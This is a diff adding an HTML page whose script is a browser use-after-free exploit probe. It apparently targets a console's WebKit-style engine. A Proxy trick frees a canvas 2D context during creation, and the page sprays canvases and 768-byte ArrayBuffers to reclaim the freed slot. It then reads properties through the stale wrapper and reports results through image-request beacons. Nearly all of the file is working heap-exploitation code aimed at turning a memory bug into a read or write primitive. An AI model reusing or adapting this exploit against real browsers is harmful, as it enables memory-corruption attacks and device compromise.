@@ -1,0 +1,72 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><title>V527 replica — AB reclaim discriminator (T1/T2)</title></head>
+<body><script>
+// pastawithpesto issue #11 (Oct 22 15:18) "The test that resolves this", rebuilt to spec
+// from published ingredients: Proxy trigger (C4/proven on this console), 500x canvas
+// same-type alias (Portablelle v3 recipe), free aliased owner, GC, spray 500x 768B AB
+// (bmalloc class 67 = the 712B CanvasRenderingContext2D slot), marker Float64 9999.99
+// in every 8-byte slot, read lineWidth through the STALE wrapper.
+// Verdicts (their oracle): 9999.99 => AB reclaimed | death at read => reclaim w/ garbage
+// (their reading) or decommit (Portablelle v7 reading) | old value => no reclaim.
+// Flow A = marker fill; Flow B = zero fill (their "zero-init wiped the vector header" note).
+function bc(m){var u='beacon?m='+encodeURIComponent('V527 '+m),t=0;
+  function f(){new Image().src=u+'&t='+Date.now();}f();setTimeout(f,500);setTimeout(f,1000);}
+function sleep(ms){return new Promise(r=>setTimeout(r,ms));}
+function proxySettings(c,cap){var fired=false;
+  return new Proxy({},{get:function(o,p){if(!fired){fired=true;cap.inner=c.getContext('2d');}return false;},
+    has:function(o,p){if(!fired){fired=true;cap.inner=c.getContext('2d');}return true;}});}
+
+function mkCanvas(i){var c=document.createElement('canvas');c.width=8;c.height=8;c.id='s'+i;
+  return [c,c.getContext('2d')];}
+
+async function flow(marker,label){
+  bc('START flow='+label);
+  var cap={inner:null,outer:null};
+  var c1=document.createElement('canvas');c1.width=8;c1.height=8;c1.id='orig';
+  cap.outer=c1.getContext('2d',proxySettings(c1,cap));           // free happens at outer return
+  // NO beacons before the spray: beacon XHRs are same-class competitors (their v3-run2 death).
+  var sp=[];for(var i=0;i<500;i++) sp.push(mkCanvas(i));          // 500x same-type reclaim
+  bc('SPRAY done n='+sp.length+' trig='+(!!cap.inner&&!!cap.outer));
+  var ident='?',idx=-1;
+  try{ident=cap.inner.canvas.id;}catch(e){bc('ALIAS-READ ERR '+e.name);return;}
+  if(ident&&ident[0]==='s'){idx=parseInt(ident.slice(1),10);}
+  bc('ALIAS ident='+ident);
+  if(idx<0){bc('NOALIAS abort');return;}
+  // Free the aliased owner: drop canvas element + its 2d wrapper for index idx.
+  var keep=sp[idx]; sp[idx]=null; keep[0]=null; keep[1]=null;
+  // Force GC without touching class 67: big-alloc churn (192MB, R4-proven survivable).
+  try{var j=[];for(var k=0;k<6;k++)j.push(new Float64Array(4*1024*1024));bc('GCCHURN done n='+j.length);j=null;}
+  catch(e){bc('GCCHURN ERR '+e.name);}
+  await sleep(1200);
+  // Spray 500 x 768B ABs, marker or zero in every 8B slot.
+  var abs=[];
+  for(i=0;i<500;i++){var ab=new ArrayBuffer(768);
+    if(marker){var f64=new Float64Array(ab);for(var s2=0;s2<96;s2++)f64[s2]=9999.99;}
+    abs.push(ab);}
+  bc('ABSPRAY done n='+abs.length);
+  await sleep(300);
+  // THE READS. Order: lineWidth (their marker oracle), then getLineDash (mja00 leak path),
+  // then canvas.id (m_canvas sanity), then fillStyle. pre-burst bc, post-burst bc.
+  bc('R1 lw pre');
+  try{var lw=cap.inner.lineWidth;bc('R1 LINEWIDTH='+lw);}catch(e){bc('R1 lw ERR '+e.name);return;}
+  await sleep(600);
+  bc('R2 dash pre');
+  try{var d=cap.inner.getLineDash();bc('R2 DASH n='+d.length+' v0='+d[0]);}catch(e){bc('R2 dash ERR '+e.name);}
+  await sleep(600);
+  bc('R3 cid pre');
+  try{bc('R3 CANVASID='+cap.inner.canvas.id);}catch(e){bc('R3 cid ERR '+e.name);}
+  await sleep(600);
+  bc('R4 fs pre');
+  try{cap.inner.fillStyle='#00ff00';bc('R4 fs wrote ok');}catch(e){bc('R4 fs ERR '+e.name);}
+  bc('FLOW-DONE '+label);
+}
+
+async function main(){
+  bc('CAP rab='+typeof ReallocatableArrayBuffer+' ab='+typeof ArrayBuffer+' idb='+typeof indexedDB);
+  await flow(true,'marker');
+  await sleep(1500);
+  await flow(false,'zero');
+  bc('ALL-DONE');
+}
+setTimeout(main,300);
+</script></body></html>
